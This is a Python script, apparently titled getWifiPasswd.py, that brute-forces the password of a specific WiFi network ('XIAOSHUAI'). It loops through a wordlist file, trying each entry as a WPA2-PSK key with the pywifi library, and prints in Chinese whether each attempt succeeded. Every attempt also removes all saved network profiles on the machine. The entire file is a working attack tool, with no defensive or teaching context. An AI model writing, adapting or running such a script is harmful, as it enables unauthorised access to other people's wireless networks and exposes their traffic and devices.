#!/usr/bin/env python
# -*- encoding: utf-8 -*-
'''
@File    :   getWifiPasswd.py
@Time    :   2021/03/09 10:20:59
@Author  :   Homer
@Version :   1.0
@Contact :   since199310@163.com
'''
import pywifi
from pywifi import const
import time

def connectWifi(sid,pwd):
    
    infaces.disconnect()

    profile = pywifi.Profile()
    profile.ssid=sid
    profile.key=pwd
    profile.auth=const.AUTH_ALG_OPEN
    profile.akm.append(const.AKM_TYPE_WPA2PSK)
    profile.cipher=const.CIPHER_TYPE_CCMP

    infaces.remove_all_network_profiles()
    tmp_profile = infaces.add_network_profile(profile)
    infaces.connect(tmp_profile)
    time.sleep(8)
    status = infaces.status()
    print(status)
    if status == const.IFACE_CONNECTED:
        print("连接成功，密码为：",pwd)
        return True
    else:
        print("密码错误:",pwd)
        return False

if __name__ == "__main__":
    sid = "XIAOSHUAI"
    wifi = pywifi.PyWiFi()
    infaces = wifi.interfaces()[0]
    # pwd = "123456"
    with open(r"c:\Users\Administrator\Desktop\2.txt") as f:
        for line in f:
            pwd = line.strip()
            res = connectWifi(sid,pwd)
            if res:
                break